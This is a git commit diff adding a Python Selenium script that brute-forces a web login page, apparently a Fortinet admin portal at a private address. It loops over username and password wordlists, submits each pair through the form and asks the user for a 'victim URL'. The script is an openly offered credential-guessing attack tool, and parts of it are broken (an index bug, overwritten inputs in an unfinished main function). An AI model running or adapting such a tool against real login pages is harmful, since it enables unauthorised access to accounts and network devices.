0d47fccee0dd522bd6dc6292db3384e8b52453b5
aitor <aitor.cavia@opendeusto.es>
2022-10-23 19:10:27 +0200

    first

--- forti-login-atack.py
+++ forti-login-atack.py
@@ -1,27 +1,82 @@
 from selenium import webdriver
+from selenium.webdriver.common.by import By
 import time, os
+from webdriver_manager.chrome import ChromeDriverManager
+import pyfiglet
 
-array = []
 
-with open ("/home/kali/Documentos/dictionary/others/diccionarios/usuarios.txt", 'r') as archivo:
-	array.append(archivo.read())
+def login(username, password):
+	try:
+		inputuser = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[1]/input")
+		inputuser.send_keys(username)
+		inputpass = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[1]/div[3]/input[1]")
+		inputpass.send_keys(password)
+		
+		loginbtn = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[2]/div/button").click()
+	except:
+		time.sleep(10)
+		web.refresh()
+		time.sleep(0.5)
+		login(username, password)
 
-web = webdriver.Firefox()
+arrayU = []
+arrayP = []
+
+
+with open("usuarios.txt") as file:
+	for line in file:
+		arrayU.append(line.rstrip())
+
+
+with open("contrasenyas.txt") as file:
+	for line in file:
+		arrayP.append(line.rstrip())
+
+
+web = webdriver.Chrome(ChromeDriverManager().install())
 web.get('https://192.168.0.2:8443')
-o#s.system("firefox https://192.168.0.2:8443 &")
-
-def login():
-	user = "user"
-	passw = "pass"
-	inputuser = web.find_element_by_spath("//*[@id='username']")
-	inputuser.send_keys(user)
-	inputpass = web.find_element_by_spath("//*[@id='secretkey']")
-	inputpass.send_keys(passw)
-	
-	loginbtn = web.find_element_by_spath("//*[@id='login_button']").click()
-	
 time.sleep(2)
-login()
 
-#def login():
+configAv = web.find_element(By.XPATH, "/html/body/div/div[2]/button[3]").click()
+acceder = web.find_element(By.XPATH, "/html/body/div/div[3]/p[2]/a").click()
+web.find_element
+
+time.sleep(1)
+
+i = 0
+if True:
+	while i < len(arrayU):
+		j = 0
+		i = i + 1
+		while j < len(arrayP):
+			login(arrayU[i], arrayP[j])
+			print("user: " + str(arrayU[i] + "\tpass: " + str(arrayP[j])))
+			time.sleep(2)
+			j = j + 1
+
 	
+def main():
+
+	ascii_banner = pyfiglet.figlet_format("http - force")
+	print(ascii_banner)
+
+	print("Introduce la URL victima:", end="")
+	url = input()
+	print("Ruta de diccionario de usuarios:", end="")
+	url = input()
+	print("Ruta de diccionario de contraseñas:", end="")
+	url = input()
+
+	print("________________________________________")
+	print("XPath of username input: ", end="")
+	userInput = input()
+
+	print("XPath of password input: ", end="")
+	passInput = input()
+
+	print("XPath of login button: ", end="")
+	buttonInput = input()
+
+
+
+
